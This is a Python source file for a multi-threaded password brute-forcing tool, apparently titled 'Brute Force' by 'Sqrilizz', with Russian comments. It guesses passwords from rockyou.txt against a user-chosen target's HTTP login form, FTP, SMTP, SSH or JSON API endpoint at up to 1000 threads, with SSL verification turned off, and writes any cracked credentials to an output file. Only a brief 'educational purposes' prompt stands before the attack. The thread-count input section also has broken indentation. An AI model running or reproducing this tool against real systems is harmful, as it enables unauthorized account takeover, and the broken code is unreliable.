import requests
import ftplib
import smtplib
import time
import threading
import os
import sys
from colorama import Fore, Style, init
import urllib3

# Отключаем предупреждения SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

class BruteForcer:
    def __init__(self):
        self.target = None
        self.username = None
        self.password_file = "Tools/rockyou.txt"
        self.protocol = "http"
        self.port = None
        self.threads = 500  # Увеличиваем до 500 потоков для максимальной скорости
        self.delay = 0.1
        self.success_count = 0
        self.failed_count = 0
        self.is_bruting = False
        self.found_credentials = []

    def print_banner(self):
        """Выводит баннер"""
        banner = f"""
{Fore.MAGENTA}   ██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗     ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
{Fore.MAGENTA}   ██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝     ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗██╔════╝
{Fore.MAGENTA}   ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗       █████╗  ██║   ██║██████╔╝██║   ██║███████╗
{Fore.MAGENTA}   ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝       ██╔══╝  ██║   ██║██╔══██╗██║   ██║╚════██║
{Fore.MAGENTA}   ██████╔╝██║  ██║██████╔╝╚██████╔╝   ██║   ███████╗     ██║     ╚██████╔╝██║  ██║╚██████╔╝███████║
{Fore.MAGENTA}   ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝   ╚══════╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Fore.MAGENTA}                                                                                                        
{Fore.MAGENTA}                              FORCE
{Fore.MAGENTA}                              by Sqrilizz
"""
        print(banner)

    def get_user_input(self):
        """Получает данные от пользователя"""
        print(f"{Fore.CYAN}[*] Brute Force Configuration")
        print(f"{Fore.CYAN}[*] ========================")
        
        # Протокол
        print(f"\n{Fore.CYAN}[*] Available Protocols:")
        print(f"{Fore.CYAN}[*] 1. HTTP/HTTPS - веб-формы")
        print(f"{Fore.CYAN}[*] 2. FTP - файловый сервер")
        print(f"{Fore.CYAN}[*] 3. SMTP - почтовый сервер")
        print(f"{Fore.CYAN}[*] 4. SSH - SSH сервер")
        print(f"{Fore.CYAN}[*] 5. Custom - пользовательский")
        
        while True:
            protocol_input = input(f"{Fore.YELLOW}[?] Choose protocol (1-5, default 1): ").strip()
            if not protocol_input:
                self.protocol = "http"
                break
            elif protocol_input in ['1', '2', '3', '4', '5']:
                protocols = {1: "http", 2: "ftp", 3: "smtp", 4: "ssh", 5: "custom"}
                self.protocol = protocols[int(protocol_input)]
                break
            else:
                print(f"{Fore.RED}[!] Invalid protocol!")
        
        # Цель
        while True:
            self.target = input(f"{Fore.YELLOW}[?] Enter target (IP/domain): ").strip()
            if self.target:
                break
            print(f"{Fore.RED}[!] Target cannot be empty!")
        
        # Порт
        while True:
            port_input = input(f"{Fore.YELLOW}[?] Enter port (default auto): ").strip()
            if not port_input:
                # Автоматический порт по протоколу
                if self.protocol == "http":
                    self.port = 80
                elif self.protocol == "https":
                    self.port = 443
                elif self.protocol == "ftp":
                    self.port = 21
                elif self.protocol == "smtp":
                    self.port = 25
                elif self.protocol == "ssh":
                    self.port = 22
                break
            else:
                try:
                    self.port = int(port_input)
                    if 1 <= self.port <= 65535:
                        break
                    else:
                        print(f"{Fore.RED}[!] Port must be between 1 and 65535!")
                except ValueError:
                    print(f"{Fore.RED}[!] Invalid port!")
        
        # Пользователь
        while True:
            self.username = input(f"{Fore.YELLOW}[?] Enter username: ").strip()
            if self.username:
                break
            print(f"{Fore.RED}[!] Username cannot be empty!")
        
        # Количество потоков
        while True:
            try:
                threads_input = input(f"{Fore.YELLOW}[?] Enter number of threads (default 500): ").strip()
                if threads_input:
                    self.threads = int(threads_input)
                                    if 1 <= self.threads <= 1000:
                    break
                else:
                    print(f"{Fore.RED}[!] Threads must be between 1 and 1000!")
                else:
                    break
            except ValueError:
                print(f"{Fore.RED}[!] Invalid threads!")
        
        # Задержка
        while True:
            try:
                delay_input = input(f"{Fore.YELLOW}[?] Enter delay between attempts in seconds (default 0.1): ").strip()
                if delay_input:
                    self.delay = float(delay_input)
                    if self.delay >= 0:
                        break
                    else:
                        print(f"{Fore.RED}[!] Delay must be positive!")
                else:
                    break
            except ValueError:
                print(f"{Fore.RED}[!] Invalid delay!")
        
        return True

    def check_http_credentials(self, password):
        """Проверяет учетные данные через HTTP"""
        try:
            # Простая проверка через POST запрос
            url = f"http://{self.target}:{self.port}/login"
            data = {
                'username': self.username,
                'password': password,
                'submit': 'Login'
            }
            
            response = requests.post(url, data=data, timeout=10, verify=False)
            
            # Проверяем успешность входа
            if response.status_code == 200:
                if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                    return True
                elif "error" not in response.text.lower() and "invalid" not in response.text.lower():
                    return True
            
            return False
            
        except Exception:
            return False

    def check_ftp_credentials(self, password):
        """Проверяет учетные данные через FTP"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=10)
            ftp.login(self.username, password)
            ftp.quit()
            return True
        except Exception:
            return False

    def check_smtp_credentials(self, password):
        """Проверяет учетные данные через SMTP"""
        try:
            server = smtplib.SMTP(self.target, self.port, timeout=10)
            server.starttls()
            server.login(self.username, password)
            server.quit()
            return True
        except Exception:
            return False

    def check_ssh_credentials(self, password):
        """Проверяет учетные данные через SSH"""
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.port, username=self.username, password=password, timeout=10)
            ssh.close()
            return True
        except Exception:
            return False

    def check_custom_credentials(self, password):
        """Проверяет учетные данные через пользовательский метод"""
        try:
            # Здесь можно добавить кастомную логику
            # Например, проверка через API или специфичный протокол
            url = f"http://{self.target}:{self.port}/api/login"
            data = {
                'user': self.username,
                'pass': password
            }
            
            response = requests.post(url, json=data, timeout=10, verify=False)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success') or result.get('token'):
                    return True
            
            return False
            
        except Exception:
            return False

    def check_credentials(self, password):
        """Проверяет учетные данные в зависимости от протокола"""
        if self.protocol == "http" or self.protocol == "https":
            return self.check_http_credentials(password)
        elif self.protocol == "ftp":
            return self.check_ftp_credentials(password)
        elif self.protocol == "smtp":
            return self.check_smtp_credentials(password)
        elif self.protocol == "ssh":
            return self.check_ssh_credentials(password)
        elif self.protocol == "custom":
            return self.check_custom_credentials(password)
        else:
            return False

    def brute_thread(self, passwords):
        """Поток для брутфорса"""
        for password in passwords:
            if not self.is_bruting:
                break
            
            try:
                if self.check_credentials(password):
                    self.success_count += 1
                    self.found_credentials.append({
                        'username': self.username,
                        'password': password,
                        'protocol': self.protocol,
                        'target': self.target
                    })
                    print(f"{Fore.GREEN}[+] CREDENTIALS FOUND! Username: {self.username}, Password: {password}")
                    return
                else:
                    self.failed_count += 1
                    print(f"{Fore.RED}[-] Failed: {self.username}:{password} (Failed: {self.failed_count})")
                
                if self.delay > 0:
                    time.sleep(self.delay)
                    
            except Exception as e:
                self.failed_count += 1
                print(f"{Fore.RED}[-] Error with {password}: {str(e)[:50]}... (Failed: {self.failed_count})")

    def load_passwords(self):
        """Загружает пароли из файла"""
        try:
            if not os.path.exists(self.password_file):
                print(f"{Fore.RED}[!] Password file not found: {self.password_file}")
                return []
            
            with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            print(f"{Fore.GREEN}[+] Loaded {len(passwords)} passwords from {self.password_file}")
            return passwords
            
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading passwords: {e}")
            return []

    def start_bruting(self):
        """Начинает брутфорс"""
        print(f"\n{Fore.RED}[!] WARNING: This tool is for educational purposes only!")
        print(f"{Fore.RED}[!] Using this tool for illegal activities is your responsibility!")
        print(f"{Fore.YELLOW}[?] Continue? (y/n): ", end="")
        
        if input().lower() != 'y':
            print(f"{Fore.YELLOW}[!] Operation cancelled")
            return
        
        # Загружаем пароли
        passwords = self.load_passwords()
        if not passwords:
            print(f"{Fore.RED}[!] No passwords loaded!")
            return
        
        print(f"\n{Fore.CYAN}[*] Starting Brute Force...")
        print(f"{Fore.CYAN}[*] Target: {self.target}:{self.port}")
        print(f"{Fore.CYAN}[*] Protocol: {self.protocol}")
        print(f"{Fore.CYAN}[*] Username: {self.username}")
        print(f"{Fore.CYAN}[*] Passwords: {len(passwords)}")
        print(f"{Fore.CYAN}[*] Threads: {self.threads}")
        print(f"{Fore.CYAN}[*] Delay: {self.delay}s")
        print(f"{Fore.CYAN}[*] Press Ctrl+C to stop\n")
        
        self.is_bruting = True
        self.success_count = 0
        self.failed_count = 0
        self.found_credentials = []
        
        start_time = time.time()
        
        try:
            # Используем ThreadPoolExecutor для лучшей производительности
            from concurrent.futures import ThreadPoolExecutor, as_completed
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                # Разделяем пароли между потоками
                chunk_size = len(passwords) // self.threads
                futures = []
                
                for i in range(self.threads):
                    start_idx = i * chunk_size
                    end_idx = start_idx + chunk_size if i < self.threads - 1 else len(passwords)
                    thread_passwords = passwords[start_idx:end_idx]
                    
                    future = executor.submit(self.brute_thread, thread_passwords)
                    futures.append(future)
                
                # Мониторим прогресс
                while self.is_bruting:
                    try:
                        elapsed = time.time() - start_time
                        total_attempts = self.success_count + self.failed_count
                        
                        if elapsed > 0:
                            rate = total_attempts / elapsed
                            progress = (total_attempts / len(passwords)) * 100 if len(passwords) > 0 else 0
                            
                            print(f"\r{Fore.CYAN}[*] Progress: {total_attempts}/{len(passwords)} ({progress:.1f}%) | "
                                  f"Valid: {len(self.found_credentials)} | "
                                  f"Invalid: {self.failed_count} | "
                                  f"Speed: {rate:.1f} attempts/sec | "
                                  f"Time: {int(elapsed)}s", end='', flush=True)
                        
                        time.sleep(1)
                        
                        # Проверяем завершение
                        if total_attempts >= len(passwords):
                            break
                            
                    except KeyboardInterrupt:
                        print(f"\n{Fore.YELLOW}[!] Stopping brute force...")
                        self.is_bruting = False
                        break
                
                # Ждем завершения всех задач
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        print(f"{Fore.RED}[!] Task error: {e}")
                        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Stopping brute force...")
            self.is_bruting = False
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Выводим статистику
        self.print_statistics(duration)

    def print_statistics(self, duration):
        """Выводит статистику"""
        total_attempts = self.success_count + self.failed_count
        success_rate = (self.success_count / total_attempts * 100) if total_attempts > 0 else 0
        
        print(f"\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║                              BRUTE FORCE COMPLETED                             ║")
        print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Fore.CYAN}[*] Target: {self.target}:{self.port}")
        print(f"{Fore.CYAN}[*] Protocol: {self.protocol}")
        print(f"{Fore.CYAN}[*] Username: {self.username}")
        print(f"{Fore.CYAN}[*] Duration: {duration:.2f} seconds")
        print(f"{Fore.CYAN}[*] Success Rate: {success_rate:.1f}%")
        print(f"{Fore.GREEN}[+] Successful attempts: {self.success_count}")
        print(f"{Fore.RED}[-] Failed attempts: {self.failed_count}")
        print(f"{Fore.YELLOW}[*] Total attempts: {total_attempts}")
        
        if self.found_credentials:
            print(f"\n{Fore.GREEN}[*] Found Credentials:")
            for cred in self.found_credentials:
                print(f"{Fore.GREEN}[+] {cred['username']}:{cred['password']} @ {cred['target']} ({cred['protocol']})")
        
        if self.success_count > 0:
            print(f"{Fore.GREEN}[+] Average speed: {total_attempts/duration:.2f} attempts/second")

    def save_results(self):
        """Сохраняет результаты в файл"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"output/brute_force_{timestamp}.txt"
        
        try:
            os.makedirs("output", exist_ok=True)
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Brute Force Results\n")
                f.write(f"==================\n")
                f.write(f"Completed: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Target: {self.target}:{self.port}\n")
                f.write(f"Protocol: {self.protocol}\n")
                f.write(f"Username: {self.username}\n")
                f.write(f"Successful: {self.success_count}\n")
                f.write(f"Failed: {self.failed_count}\n")
                f.write(f"Total: {self.success_count + self.failed_count}\n")
                
                if self.found_credentials:
                    f.write(f"\nFound Credentials:\n")
                    f.write(f"=================\n")
                    for cred in self.found_credentials:
                        f.write(f"{cred['username']}:{cred['password']} @ {cred['target']} ({cred['protocol']})\n")
            
            print(f"{Fore.GREEN}[+] Results saved to: {filename}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to save results: {e}")

    def run(self):
        """Запускает брутфорс"""
        self.print_banner()
        
        if not self.get_user_input():
            return
        
        self.start_bruting()
        self.save_results()

def main():
    """Главная функция"""
    try:
        bruter = BruteForcer()
        bruter.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Exiting...")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}")

if __name__ == "__main__":
    main() 